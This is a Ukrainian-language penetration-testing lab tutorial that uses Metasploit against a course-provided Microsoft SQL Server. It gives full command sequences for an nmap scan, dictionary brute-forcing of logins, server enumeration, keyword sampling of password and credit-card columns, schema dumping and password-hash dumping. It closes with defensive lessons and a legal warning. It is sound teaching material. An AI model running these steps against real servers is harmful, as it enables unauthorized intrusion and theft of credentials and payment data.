Metasploit Framework

У цій лабораторній роботі ми попрактикуємося з Metasploit — одним із найважливіших інструментів в арсеналі пентестера. Це потужний набір засобів для тестування на проникнення: виявлення вразливостей у системах і їх контрольованої експлуатації.

Ключові можливості Metasploit Framework:

  • База вразливостей: відомості про відомі вразливості ПЗ, ОС, протоколів і сервісів — допомагає визначити точки входу.
  • Експлойти та модулі: готові засоби для атак, віддаленого виконання коду, перехоплення сесій тощо.
  • Гнучке налаштування під конкретну задачу тестування.
  • Модульна структура з розширенням сторонніми модулями.
  • Керування й звітність: моніторинг прогресу та детальні звіти для замовника.
Усі дії в цій роботі виконуються проти навчального SQL-сервера, який надає курс, у межах ізольованої лабораторної мережі. Повторювати ці кроки проти будь-яких інших систем без письмового дозволу власника заборонено законом (стаття 361 КК України).

Лабораторна робота: атака на SQL-сервер

Для зручності можеш виконувати роботу за цим документом.

Крок 1. Підключення до віртуальної машини через PuTTY

PuTTY — програма для віддаленого підключення до віртуальної машини по SSH. Завантаж її з офіційного сайту, обери файл під свою систему й пройди кроки встановлення. Після цього на робочому столі з'явиться ярлик:

  1. Запусти PuTTY.
  2. У розділі Session введи IP-адресу (або доменне ім'я) віртуальної машини. Порт SSH за замовчуванням — 22.
  3. Натисни Open, щоб встановити з'єднання.
  4. У вікні введи ім'я користувача й пароль. Щоб уникнути помилок, їх краще скопіювати: виділи текст, натисни Ctrl + C і встав правою кнопкою миші у вікні PuTTY.
  5. Пароль у PuTTY не відображається — просто введи або встав його й натисни Enter.
Логін, пароль та IP-адресу віртуальної машини отримуй у клієнт-менеджера (КХМ).

Крок 2. Встановлення Metasploit на Ubuntu

Спершу онови систему й встанови залежності:

sudo apt update
sudo apt upgrade
sudo apt install curl gnupg apt-transport-https

Тут curl завантажує файли, gnupg працює з GPG-ключами, а apt-transport-https додає підтримку HTTPS-репозиторіїв.

Завантаж і додай GPG-ключ Metasploit до довірених (для перевірки автентичності пакетів):

curl https://apt.metasploit.com/metasploit-framework.gpg.key | sudo gpg --dearmor | sudo tee /usr/share/keyrings/metasploit-archive-keyring.gpg > /dev/null

Завантаж інсталяційний скрипт з офіційного репозиторію, дай права на виконання й запусти його:

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

Крок 3. Розвідка портів за допомогою Nmap

Встанови Nmap і проскануй підмережу SQL-сервера:

sudo apt install nmap
nmap 10.0.1.4/24

Порт 1433 — стандартний порт Microsoft SQL Server. Він відкритий, тож ціль нам підходить.

Крок 4. Запуск Metasploit

/opt/metasploit-framework/bin/msfconsole

Проведення атаки

Злам пароля (атака словником)

Сервер знайдено — тепер треба отримати до нього облікові дані. Застосуємо атаку словником: модуль перебере списки логінів і паролів. Спершу підготуй два файли через редактор nano:

use auxiliary/scanner/mssql/mssql_login
nano user.txt        # можливі логіни для перебору
nano passwords.txt   # можливі паролі

У nano вводиш по одному значенню в рядок, зберігаєш комбінацією Ctrl + O (потім Enter) і виходиш через Ctrl + X.

Тепер вкажи ціль і файли та запусти перебір:

set rhosts 10.0.1.4
set user_file user.txt
set pass_file passwords.txt
set verbose false
exploit

Перебір знайшов робочу пару логін-пароль — lowpriv : Password@1. Далі всі модулі запускаємо вже з цими даними.

Версія MSSQL

Модуль mssql_sql виконує довільний SQL-запит. Запустимо select @@version, щоб дізнатися версію сервера:

use auxiliary/admin/mssql/mssql_sql
set rhosts 10.0.1.4
set username lowpriv
set password Password@1
exploit

Перерахування сервера (enumeration)

Модуль mssql_enum збирає загальну інформацію про сервер: параметри конфігурації, список баз даних, їхні файли, логіни, збережені процедури тощо.

use auxiliary/admin/mssql/mssql_enum
set rhosts 10.0.1.4
set username lowpriv
set password Password@1
exploit

Перерахування логінів SQL

Модуль mssql_enum_sql_logins дає точний список усіх логінів на сервері:

use auxiliary/admin/mssql/mssql_enum_sql_logins
set rhosts 10.0.1.4
set username lowpriv
set password Password@1
exploit
Модуль показав, що «низькопривілейований» обліковий запис lowpriv насправді має роль sysadmin — повний контроль над сервером. Саме такі помилки конфігурації й шукає пентестер.

Вивантаження даних (dump)

Модуль mssql_findandsampledata шукає в базах стовпці за ключовими словами й показує зразки даних. Пошукаємо імена, паролі та номери карток:

use auxiliary/admin/mssql/mssql_findandsampledata
set rhosts 10.0.1.4
set username lowpriv
set password Password@1
set sample_size 4
set keywords FirstName|passw|credit
exploit

Схема бази даних (schema dump)

Модуль mssql_schemadump вивантажує схему сервера — назви баз, таблиць, стовпців та їхні типи:

use auxiliary/scanner/mssql/mssql_schemadump
set rhosts 10.0.1.4
set username lowpriv
set password Password@1
exploit

Дамп хешів (hash dump)

Нарешті, mssql_hashdump вивантажує хеші паролів облікових записів сервера — їх потім можна спробувати зламати офлайн:

use auxiliary/scanner/mssql/mssql_hashdump
set rhosts 10.0.1.4
set username lowpriv
set password Password@1
exploit
Що показала ця робота з погляду захисту: не можна давати робочим обліковим записам роль sysadmin; паролі (Password@1) мають бути складними; чутливі дані (номери карток) не можна зберігати у відкритому вигляді; доступ до порту 1433 ззовні слід обмежувати.

Коротко про Metasploit

Metasploit — найпоширеніший фреймворк для експлуатації вразливостей. Він підтримує всі етапи тестування на проникнення: від збору інформації до постексплуатації. Є дві основні версії:

ВерсіяОпис
Metasploit ProКомерційна версія з графічним інтерфейсом (GUI), що спрощує автоматизацію й керування задачами
Metasploit FrameworkВерсія з відкритим кодом, що працює через командний рядок. Встановлена на більшості дистрибутивів Linux для пентесту — саме її ми використовували

Основні компоненти

  • msfconsole — основний інтерфейс командного рядка, через який ти взаємодієш з Metasploit.
  • Модулі — виконують конкретні завдання (саме їх ми запускали командою use).
  • Інструменти — окремі утиліти, як-от msfvenom для створення payload.

Типи модулів:

Тип модуляПризначення
Exploit (експлойт)Код, що використовує вразливість для отримання контролю над системою
PayloadКод, який виконується на скомпрометованій системі після успішного експлойту
Auxiliary (допоміжний)Сканування та збір інформації — усі модулі цієї роботи були саме auxiliary
Post (постексплуатація)Завдання після отримання доступу: збір даних, подальша експлуатація
Encoder (енкодер)Шифрує payload для обходу антивірусного ПЗ
